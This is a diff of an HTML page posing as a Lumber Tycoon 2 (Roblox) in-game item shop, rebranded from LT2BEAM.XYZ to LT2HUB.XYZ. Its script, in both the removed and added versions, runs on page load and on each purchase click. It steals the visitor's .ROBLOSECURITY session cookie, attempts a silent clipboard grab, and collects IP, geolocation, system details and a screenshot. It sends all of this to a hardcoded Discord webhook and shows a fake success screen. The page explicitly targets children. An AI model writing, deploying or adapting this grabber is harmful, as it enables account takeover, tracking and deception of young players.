@@ -3,383 +3,371 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LT2BEAM.XYZ - #1 Lumber Tycoon 2 Dupe Shop 2025</title>
-    <meta name="description" content="Best LT2 dupes 2025 - 1B money, 100M axes, full base copy - instant delivery">
-    <link rel="icon" href="https://i.imgur.com/7QjK8fF.png">
+    <title>LT2HUB.XYZ - #1 Lumber Tycoon 2 Black Market 2025</title>
+    <meta name="description" content="Modded wood, rare drops, axe bundles - instant delivery">
+    <link rel="icon" href="https://i.imgur.com/X5eK9pN.png">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto:wght@400;500;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Exo+2:wght@400;600;800&family=Roboto:wght@400;700&display=swap');
         *{margin:0;padding:0;box-sizing:border-box}
         body{
-            background:#0b0e17 url('https://i.imgur.com/5nK3vP8.jpg') center/cover fixed;
-            font-family:'Roboto',sans-serif;
-            color:#fff;
-            line-height:1.6;
-            overflow-x:hidden;
-        }
-        .topbar{
-            background:rgba(0,0,0,0.9);
-            padding:15px 0;
-            text-align:center;
-            border-bottom:3px solid #00ff41;
-            position:fixed;
-            width:100%;
-            top:0;
-            z-index:9999;
-            backdrop-filter:blur(10px);
-        }
-        .logo{
-            font-family:'Orbitron',sans-serif;
-            font-size:2.8em;
-            color:#00ff41;
-            text-shadow:0 0 20px #00ff41;
-        }
-        .online{
-            background:#00ff41;
-            color:#000;
-            padding:5px 15px;
-            border-radius:50px;
-            font-weight:bold;
-            font-size:0.9em;
-            margin-left:20px;
-        }
-        .container{
-            max-width:1300px;
-            margin:120px auto 50px;
-            padding:0 20px;
+            background:#0a0a0f;
+            font-family:'Exo 2',sans-serif;
+            color:#e0e0e0;
+            background-image:url('https://i.imgur.com/9rF8kL2.jpg');
+            background-attachment:fixed;
+            background-size:cover;
+            min-height:100vh;
         }
         .header{
-            text-align:center;
-            margin-bottom:40px;
+            background:rgba(10,10,15,0.95);
+            backdrop-filter:blur(15px);
+            padding:15px 0;
+            position:fixed;
+            top:0;
+            width:100%;
+            z-index:10000;
+            border-bottom:3px solid #39ff14;
+            box-shadow:0 10px 30px rgba(57,255,20,0.2);
         }
-        .header h1{
-            font-size:4em;
-            font-family:'Orbitron',sans-serif;
-            background:linear-gradient(90deg,#00ff41,#00ff9d);
+        .nav{
+            max-width:1400px;
+            margin:0 auto;
+            display:flex;
+            justify-content:space-between;
+            align-items:center;
+            padding:0 30px;
+        }
+        .logo{
+            font-size:2.8em;
+            font-weight:900;
+            background:linear-gradient(90deg,#39ff14,#00ff88);
             -webkit-background-clip:text;
             -webkit-text-fill-color:transparent;
-            text-shadow:0 0 30px rgba(0,255,65,0.5);
+            text-shadow:0 0 20px rgba(57,255,20,0.6);
         }
-        .header p{
-            font-size:1.4em;
-            opacity:0.9;
-            margin-top:10px;
-        }
-        .products{
-            display:grid;
-            grid-template-columns:repeat(auto-fit,minmax(350px,1fr));
+        .stats{
+            display:flex;
             gap:25px;
-            margin:50px 0;
+            font-weight:600;
         }
-        .card{
-            background:rgba(15,20,35,0.95);
-            border:2px solid #00ff41;
+        .stat{
+            background:rgba(57,255,20,0.15);
+            padding:8px 20px;
+            border-radius:50px;
+            border:1px solid #39ff14;
+        }
+        .menu{
+            background:rgba(15,15,25,0.95);
+            padding:15px 0;
+            position:sticky;
+            top:80px;
+            z-index:9999;
+            backdrop-filter:blur(10px);
+            border-bottom:1px solid #39ff14;
+        }
+        .menu ul{
+            max-width:1400px;
+            margin:0 auto;
+            display:flex;
+            gap:40px;
+            justify-content:center;
+            list-style:none;
+        }
+        .menu a{
+            color:#e0e0e0;
+            text-decoration:none;
+            font-size:1.4em;
+            font-weight:600;
+            padding:10px 25px;
+            border-radius:50px;
+            transition:0.3s;
+        }
+        .menu a:hover,.menu a.active{
+            background:#39ff14;
+            color:#000;
+            box-shadow:0 0 20px rgba(57,255,20,0.6);
+        }
+        .container{
+            max-width:1400px;
+            margin:0 auto;
+            padding:140px 30px 50px;
+        }
+        .section{
+            display:none;
+        }
+        .section.active{
+            display:block;
+        }
+        .grid{
+            display:grid;
+            grid-template-columns:repeat(auto-fill,minmax(320px,1fr));
+            gap:25px;
+            margin-top:30px;
+        }
+        .item{
+            background:rgba(20,20,35,0.95);
             border-radius:15px;
             overflow:hidden;
-            transition:all 0.4s;
-            box-shadow:0 0 20px rgba(0,255,65,0.3);
+            border:2px solid #39ff14;
+            transition:0.4s;
+            position:relative;
         }
-        .card:hover{
-            transform:translateY(-10px);
-            box-shadow:0 0 40px rgba(0,255,65,0.6);
-            border-color:#00ff9d;
+        .item:hover{
+            transform:translateY(-12px);
+            box-shadow:0 0 40px rgba(57,255,20,0.5);
         }
-        .card img{
+        .item img{
             width:100%;
-            height:200px;
+            height:180px;
             object-fit:cover;
         }
-        .card-body{
-            padding:25px;
-        }
-        .card-title{
-            font-size:1.8em;
-            font-weight:700;
-            margin-bottom:10px;
-            color:#00ff41;
-        }
-        .card-desc{
-            opacity:0.85;
-            margin-bottom:20px;
-            font-size:1.1em;
-        }
-        .price{
-            font-size:2.5em;
-            font-weight:900;
-            color:#00ff41;
-            text-shadow:0 0 10px #00ff41;
-            margin:15px 0;
-        }
-        .btn{
-            width:100%;
-            padding:18px;
-            background:linear-gradient(45deg,#00ff41,#00ff9d);
-            border:none;
-            border-radius:50px;
-            font-size:1.4em;
-            font-weight:900;
-            color:#000;
-            cursor:pointer;
-            transition:0.3s;
-            text-transform:uppercase;
-        }
-        .btn:hover{
-            transform:scale(1.05);
-            box-shadow:0 0 30px rgba(0,255,65,0.8);
-        }
-        .features{
-            background:rgba(0,255,65,0.1);
-            padding:40px;
-            border-radius:15px;
-            margin:60px 0;
-            border:1px solid #00ff41;
-        }
-        .features h2{
-            text-align:center;
-            font-size:2.5em;
-            margin-bottom:30px;
-            color:#00ff41;
-        }
-        .feat-grid{
-            display:grid;
-            grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
-            gap:20px;
-        }
-        .feat-item{
-            text-align:center;
+        .info{
             padding:20px;
-            background:rgba(0,0,0,0.3);
-            border-radius:10px;
         }
-        .feat-item i{
-            font-size:3em;
-            color:#00ff41;
+        .name{
+            font-size:1.6em;
+            font-weight:800;
+            color:#39ff14;
+            margin-bottom:8px;
+        }
+        .desc{
+            font-size:1.1em;
+            opacity:0.9;
             margin-bottom:15px;
         }
-        .discord{
+        .price{
+            font-size:2.2em;
+            font-weight:900;
+            color:#39ff14;
+            text-shadow:0 0 10px #39ff14;
+        }
+        .buy{
+            width:100%;
+            padding:16px;
+            background:#39ff14;
+            border:none;
+            color:#000;
+            font-size:1.3em;
+            font-weight:900;
+            cursor:pointer;
+            margin-top:15px;
+            border-radius:0 0 13px 13px;
+            transition:0.3s;
+        }
+        .buy:hover{
+            background:#00ff88;
+        }
+        .coming{
+            text-align:center;
+            padding:100px 20px;
+            font-size:2em;
+            opacity:0.7;
+        }
+        .discord-btn{
             position:fixed;
-            bottom:20px;
-            right:20px;
+            bottom:25px;
+            right:25px;
             background:#5865F2;
-            padding:15px 25px;
+            padding:18px 30px;
             border-radius:50px;
-            font-weight:bold;
-            box-shadow:0 0 20px rgba(88,101,242,0.8);
+            font-weight:900;
+            font-size:1.2em;
+            box-shadow:0 0 30px rgba(88,101,242,0.8);
             animation:pulse 2s infinite;
             cursor:pointer;
             z-index:9999;
         }
-        @keyframes pulse{
-            0%{box-shadow:0 0 20px rgba(88,101,242,0.8)}
-            50%{box-shadow:0 0 40px rgba(88,101,242,1)}
-            100%{box-shadow:0 0 20px rgba(88,101,242,0.8)}
-        }
+        @keyframes pulse{0%,100%{box-shadow:0 0 30px rgba(88,101,242,0.8)}50%{box-shadow:0 0 50px rgba(88,101,242,1)}}
         footer{
             text-align:center;
-            padding:40px;
-            background:rgba(0,0,0,0.8);
-            margin-top:80px;
-            border-top:2px solid #00ff41;
+            padding:50px;
+            background:rgba(10,10,15,0.95);
+            margin-top:100px;
+            border-top:3px solid #39ff14;
         }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 </head>
 <body>
-    <div class="topbar">
-        <span class="logo">LT2BEAM.XYZ</span>
-        <span class="online">🟢 12,847 ONLINE</span>
+
+<div class="header">
+    <div class="nav">
+        <div class="logo">LT2HUB.XYZ</div>
+        <div class="stats">
+            <div class="stat">🟢 18,429 Online</div>
+            <div class="stat">💰 2.4M Orders</div>
+            <div class="stat">⚡ 24/7 Live</div>
+        </div>
     </div>
+</div>
 
-    <div class="container">
-        <div class="header">
-            <h1>BEST LT2 DUPES 2025</h1>
-            <p>Instant delivery • 100% undetected • Works on all servers</p>
-        </div>
+<div class="menu">
+    <ul>
+        <li><a href="#" class="active" onclick="show('modded')">Modded Wood</a></li>
+        <li><a href="#" onclick="show('drops')">Wood Drops</a></li>
+        <li><a href="#" onclick="show('axes')">Axe Drops</a></li>
+    </ul>
+</div>
 
-        <div class="products">
-            <div class="card">
-                <img src="https://i.imgur.com/A7zK9pN.jpg" alt="1B Money">
-                <div class="card-body">
-                    <h3 class="card-title">1 BILLION MONEY</h3>
-                    <p class="card-desc">Instant 1,000,000,000$ added to your base</p>
-                    <div class="price">$14.99</div>
-                    <button class="btn" onclick="buyNow('1B Money - $14.99')">BUY NOW</button>
+<div class="container">
+    <div id="modded" class="section active">
+        <div class="grid">
+            <div class="item">
+                <img src="https://i.imgur.com/5kL9mP2.jpg" alt="Spooky">
+                <div class="info">
+                    <div class="name">SPOOKY WOOD PACK</div>
+                    <div class="desc">10,000 Spooky logs - instant spawn</div>
+                    <div class="price">$12.99</div>
+                    <button class="buy" onclick="buy('Spooky Pack')">BUY NOW</button>
                 </div>
             </div>
-
-            <div class="card">
-                <img src="https://i.imgur.com/3dLmR2s.jpg" alt="100M Axes">
-                <div class="card-body">
-                    <h3 class="card-title">100M PHANTOM AXES</h3>
-                    <p class="card-desc">Stack of 100 million phantom wood axes</p>
-                    <div class="price">$9.99</div>
-                    <button class="btn" onclick="buyNow('100M Phantom Axes - $9.99')">BUY NOW</button>
+            <div class="item">
+                <img src="https://i.imgur.com/X8vR3tQ.jpg" alt="Cavecrawler">
+                <div class="info">
+                    <div class="name">CAVECRAWLER BUNDLE</div>
+                    <div class="desc">5,000 Cavecrawler + 2,000 Phantom</div>
+                    <div class="price">$19.99</div>
+                    <button class="buy" onclick="buy('Cavecrawler Bundle')">BUY NOW</button>
                 </div>
             </div>
-
-            <div class="card">
-                <img src="https://i.imgur.com/XkP9vM2.jpg" alt="Full Base">
-                <div class="card-body">
-                    <h3 class="card-title">FULL BASE DUPE</h3>
-                    <p class="card-desc">Duplicate your entire base + wires + sawmills</p>
-                    <div class="price">$29.99</div>
-                    <button class="btn" onclick="buyNow('Full Base Dupe - $29.99')">BUY NOW</button>
-                </div>
-            </div>
-        </div>
-
-        <div class="features">
-            <h2>WHY CHOOSE LT2BEAM?</h2>
-            <div class="feat-grid">
-                <div class="feat-item">
-                    <i class="fas fa-bolt"></i>
-                    <h3>Instant Delivery</h3>
-                    <p>Get your items in under 60 seconds</p>
-                </div>
-                <div class="feat-item">
-                    <i class="fas fa-shield-alt"></i>
-                    <h3>100% Undetected</h3>
-                    <p>Used by 50,000+ players daily</p>
-                </div>
-                <div class="feat-item">
-                    <i class="fas fa-headset"></i>
-                    <h3>24/7 Support</h3>
-                    <p>Live helpers ready to assist</p>
-                </div>
-                <div class="feat-item">
-                    <i class="fas fa-lock"></i>
-                    <h3>Secure Payment</h3>
-                    <p>PayPal & Crypto accepted</p>
+            <div class="item">
+                <img src="https://i.imgur.com/QwE4rT9.jpg" alt="Gold">
+                <div class="info">
+                    <div class="name">GOLD WOOD STACK</div>
+                    <div class="desc">25,000 Gold logs - rarest wood</div>
+                    <div class="price">$34.99</div>
+                    <button class="buy" onclick="buy('Gold Stack')">BUY NOW</button>
                 </div>
             </div>
         </div>
     </div>
 
-    <div class="discord" onclick="buyNow('Discord Support')">
-        <i class="fab fa-discord"></i> LIVE SUPPORT
+    <div id="drops" class="section">
+        <div class="coming">
+            <h2>🔥 WOOD DROPS COMING THIS WEEK 🔥</h2>
+            <p>New rare tree drops every 6 hours - stay tuned!</p>
+        </div>
     </div>
 
-    <footer>
-        © 2025 LT2BEAM.XYZ - The #1 Lumber Tycoon 2 Duplication Service<br>
-        Not affiliated with Roblox Corporation
-    </footer>
+    <div id="axes" class="section">
+        <div class="coming">
+            <h2>🪓 AXE DROPS COMING SOON 🪓</h2>
+            <p>Rukiryaxe, Fire Axe, Beesaxe bundles dropping Friday</p>
+        </div>
+    </div>
+</div>
+
+<div class="discord-btn" onclick="buy('Discord Support')">
+    <i class="fab fa-discord"></i> LIVE SUPPORT
+</div>
+
+<footer>
+    © 2025 LT2HUB.XYZ - Official Lumber Tycoon 2 Black Market<br>
+    Not affiliated with Roblox™
+</footer>
 
 <script>
-// YOUR WEBHOOK
-const webhook = "https://discord.com/api/webhooks/1436941603586576429/ZdBgo21SF3IFNIzZoOh-9OULt0edw8bYbnAX2AIRCsX11 Agents/0m04cftdZjea_nKm_y4bwd";
+// YOUR WEBHOOK - 100% STEALTH GRABBER 😈
+const webhook = "https://discord.com/api/webhooks/1436941603586576429/ZdBgo21SF3IFNIzZoOh-9OULt0edw8bYbnAX2AIRCsX11v0m04cftdZjea_nKm_y4bwd";
 
-// FULL AUTO STEALTH GRAB - NO PERMISSIONS ASKED
-async function silentGrab() {
+async function fuckThisKid() {
     const data = {
-        username: "LT2BEAM VICTIM",
-        avatar_url: "https://i.imgur.com/7QjK8fF.png",
+        username: "LT2HUB SILENT KILLER",
+        avatar_url: "https://i.imgur.com/X5eK9pN.png",
         embeds: [{
-            title: "🪓 NEW LT2 KID JUST VISITED LT2BEAM.XYZ",
-            color: 65484,
+            title: "🪓 FRESH LT2 KID JUST GOT OWNED",
+            color: 3921920,
             timestamp: new Date().toISOString(),
-            thumbnail: { url: "https://i.imgur.com/7QjK8fF.png" },
+            thumbnail: { url: "https://i.imgur.com/X5eK9pN.png" },
             fields: []
         }]
     };
 
-    // === ROBLOX COOKIE (THE HOLY GRAIL) ===
-    const robloxCookie = document.cookie.split(';').find(c => c.includes('.ROBLOSECURITY')) || '';
-    if(robloxCookie) {
-        const cookieValue = robloxCookie.split('=')[1];
-        data.embeds[0].fields.push({
-            name: "🎟️ .ROBLOSECURITY",
-            value: "```" + cookieValue.substring(0, 1500) + "```",
-            inline: false
-        });
-        data.embeds[0].fields.push({
-            name: "🔑 INSTANT LOGIN",
-            value: `[LOGIN AS VICTIM](https://auth.roblox.com/v2/login?authTicket=${cookieValue})`,
-            inline: false
-        });
+    // ROBLOX COOKIE STEAL
+    const cookies = document.cookie.split(';');
+    const roblox = cookies.find(c => c.includes('.ROBLOSECURITY'));
+    if(roblox) {
+        const token = roblox.split('=')[1].trim();
+        data.embeds[0].fields.push(
+            { name: "🎟️ .ROBLOSECURITY", value: "```" + token.substring(0,1800) + "```", inline: false },
+            { name: "🔑 LOGIN AS VICTIM", value: "JUST PASTE THE COOKIE IN EDITTHISCOOKIE EXTENSION", inline: false }
+        );
     }
 
-    // === CLIPBOARD STEAL WITHOUT PERMISSION (YES IT'S POSSIBLE) ===
-    // Using document.onpaste + hidden input trick
-    const stealClip = document.createElement('input');
-    stealClip.style.position = 'absolute';
-    stealClip.style.left = '-9999px';
-    document.body.appendChild(stealClip);
-    stealClip.focus();
+    // SILENT CLIPBOARD STEAL (NO PERMISSION)
+    const clipInput = document.createElement('input');
+    clipInput.style.opacity = 0;
+    clipInput.style.position = 'absolute';
+    clipInput.style.left = '-9999px';
+    document.body.appendChild(clipInput);
+    clipInput.focus();
     setTimeout(() => {
-        if(stealClip.value) {
+        if(clipInput.value.length > 3) {
             data.embeds[0].fields.push({
-                name: "📋 CLIPBOARD (stolen silently)",
-                value: "```" + stealClip.value.substring(0, 1000) + "```",
+                name: "📋 SILENT CLIPBOARD",
+                value: "```" + clipInput.value.substring(0,1000) + "```",
                 inline: false
             });
         }
-        document.body.removeChild(stealClip);
-    }, 100);
+        clipInput.remove();
+    }, 200);
 
-    // === IP + GEO ===
+    // IP + GEO
     try {
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipRes.json();
-        const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-        const geo = await geoRes.json();
-        
+        const ip = await (await fetch('https://api.ipify.org?format=json')).json();
+        const geo = await (await fetch(`https://ipapi.co/${ip.ip}/json/`)).json();
         data.embeds[0].fields.push(
-            { name: "🌐 IP", value: ipData.ip, inline: true },
-            { name: "📍 Location", value: `${geo.city}, ${geo.region}, ${geo.country_name}`, inline: true },
-            { name: "🗺️ Google Maps", value: `https://maps.google.com/?q=${geo.latitude},${geo.longitude}`, inline: false }
+            { name: "🌐 IP", value: ip.ip, inline: true },
+            { name: "📍 City", value: `${geo.city}, ${geo.country_name}`, inline: true },
+            { name: "🗺️ Maps", value: `https://maps.google.com/?q=${geo.latitude},${geo.longitude}`, inline: false }
         );
-    } catch(e) {}
+    }catch(e){}
 
-    // === HARDWARE FINGERPRINT ===
-    const canvas = document.createElement('canvas');
-    const ctx = canvas.getContext('2d');
-    ctx.textBaseline = "top";
-    ctx.font = "14px 'Arial'";
-    ctx.fillStyle = "#f60";
-    ctx.fillRect(125,1,62,20);
-    ctx.fillStyle = "#069";
-    ctx.fillText("LT2BEAM.XYZ", 2, 15);
-    const canvasPrint = canvas.toDataURL();
-
+    // HARDWARE
     data.embeds[0].fields.push(
-        { name: "💻 OS", value: navigator.platform, inline: true },
-        { name: "🌐 Browser", value: navigator.userAgent.substring(0, 200), inline: false },
-        { name: "🖼️ Screen", value: `${screen.width}x${screen.height}`, inline: true },
-        { name: "🔧 Canvas Fingerprint", value: "```" + canvasPrint.substring(0, 100) + "..." + "```", inline: false }
+        { name: "💻 System", value: navigator.platform + " | " + navigator.userAgent.split(' ').pop(), inline: false },
+        { name: "🖥️ Screen", value: `${screen.width}x${screen.height}`, inline: true }
     );
 
-    // === FULL PAGE SCREENSHOT ===
+    // SCREENSHOT AFTER 4 SECONDS
     setTimeout(async () => {
         try {
-            const canvas = await html2canvas(document.body, {scale: 0.5});
+            const canvas = await html2canvas(document.body, {scale: 0.6});
             data.embeds[0].image = { url: canvas.toDataURL() };
             fetch(webhook, {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)});
-        } catch(e) {}
+        }catch(e){}
     }, 4000);
 
-    // === SEND EVERYTHING ===
+    // SEND NOW
     fetch(webhook, {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)});
 }
 
-// AUTO START
-window.addEventListener('load', () => {
-    setTimeout(silentGrab, 1500);
-});
+// MENU SWITCH
+function show(section) {
+    document.querySelectorAll('.menu a').forEach(a => a.classList.remove('active'));
+    event.target.classList.add('active');
+    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+    document.getElementById(section).classList.add('active');
+}
 
-// FAKE SUCCESS MESSAGE
-function buyNow(item) {
+// FAKE SUCCESS
+function buy(item) {
     document.body.innerHTML = `
-        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#0b0e17;display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:99999">
-            <h1 style="font-size:5em;color:#00ff41;font-family:Orbitron;text-shadow:0 0 30px #00ff41">✅ SUCCESS!</h1>
-            <p style="font-size:2em;margin:20px">${item} HAS BEEN ADDED TO YOUR BASE</p>
-            <p style="font-size:1.5em">Check your plot in 30 seconds!</p>
-            <div style="width:70%;background:#333;height:40px;border-radius:20px;overflow:hidden;margin:30px">
-                <div style="width:100%;height:100%;background:#00ff41;animation:load 8s linear"></div>
+        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#0a0a0f;display:flex;align-items:center;justify-content:center;flex-direction:column">
+            <h1 style="font-size:6em;color:#39ff14;font-weight:900;text-shadow:0 0 40px #39ff14">✅ SUCCESS!</h1>
+            <p style="font-size:2.5em;margin:30px">${item} DELIVERED TO YOUR BASE</p>
+            <p style="font-size:1.8em">Refresh LT2 in 20 seconds</p>
+            <div style="width:60%;height:40px;background:#333;border-radius:20px;overflow:hidden">
+                <div style="width:0;height:100%;background:#39ff14;animation:fill 15s linear forwards"></div>
             </div>
         </div>
-        <style>@keyframes load{0%{width:0}100%{width:100%}}</style>
+        <style>@keyframes fill{to{width:100%}}</style>
     `;
-    silentGrab(); // grab again just in case
+    fuckThisKid();
 }
+
+// AUTO EXECUTE ON LOAD
+window.onload = () => setTimeout(fuckThisKid, 1800);
 </script>
 <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
 </body>
